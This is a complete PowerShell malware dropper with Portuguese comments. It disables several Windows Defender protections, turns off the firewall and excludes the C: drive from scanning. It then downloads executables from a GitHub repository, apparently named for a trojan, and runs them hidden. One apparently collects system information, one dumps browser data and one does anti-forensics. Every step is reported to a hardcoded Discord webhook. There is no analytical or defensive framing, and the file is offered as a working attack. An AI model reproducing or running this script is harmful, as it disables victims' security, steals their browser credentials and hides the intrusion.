# mandante.ps1 (corrigido)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$TempFolder = $env:TEMP

function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $escaped = $Message -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r'
    $json = "{`"content`":`"$escaped`"}"
    try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null } catch {}
}

Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/7)"
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando IOAV (2/7)"
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/7)"
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando envio de amostras (4/7)"
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Send-DiscordWebhook "🛡️ Desativando MAPS (5/7)"
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
Send-DiscordWebhook "🔥 Desligando Firewall (6/7)"
netsh advfirewall set allprofiles state off
Send-DiscordWebhook "📅 Adicionando exclusão do C:\ (7/7)"
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue

# ==================================================
# BAIXA OS EXECUTÁVEIS (COM VERIFICAÇÃO)
# ==================================================
function Download-File {
    param($url, $path)
    try {
        (New-Object Net.WebClient).DownloadFile($url, $path)
        Write-Host "Baixado: $path"
        return $true
    } catch {
        Write-Host "ERRO ao baixar $url : $_"
        return $false
    }
}

Send-DiscordWebhook "🖥️ Baixando sysinfo.exe..."
$sysinfoUrl = "https://github.com/gsfv/tro.j/raw/refs/heads/main/sysinfo.exe"
$sysinfoPath = "$TempFolder\sysinfo.exe"
if (Download-File $sysinfoUrl $sysinfoPath) {
    Send-DiscordWebhook "🖥️ Executando sysinfo.exe..."
    Start-Process -FilePath $sysinfoPath -Wait -WindowStyle Hidden
} else {
    Send-DiscordWebhook "❌ Falha ao baixar sysinfo.exe"
}

Send-DiscordWebhook "🌐 Baixando dumpbrowserdata.exe..."
$dumpUrl = "https://github.com/gsfv/tro.j/raw/refs/heads/main/dumpbrowserdata.exe"
$dumpPath = "$TempFolder\dumpbrowserdata.exe"
if (Download-File $dumpUrl $dumpPath) {
    Send-DiscordWebhook "🌐 Executando dumpbrowserdata.exe..."
    Start-Process -FilePath $dumpPath -Wait -WindowStyle Hidden
} else {
    Send-DiscordWebhook "❌ Falha ao baixar dumpbrowserdata.exe"
}

Send-DiscordWebhook "🧹 Baixando antiforensics.exe..."
$antiUrl = "https://github.com/gsfv/tro.j/raw/refs/heads/main/antiforensics.exe"
$antiPath = "$TempFolder\antiforensics.exe"
if (Download-File $antiUrl $antiPath) {
    Send-DiscordWebhook "🧹 Executando antiforensics.exe..."
    Start-Process -FilePath $antiPath -Wait -WindowStyle Hidden
} else {
    Send-DiscordWebhook "❌ Falha ao baixar antiforensics.exe"
}

Send-DiscordWebhook "✅ Processo concluído!"
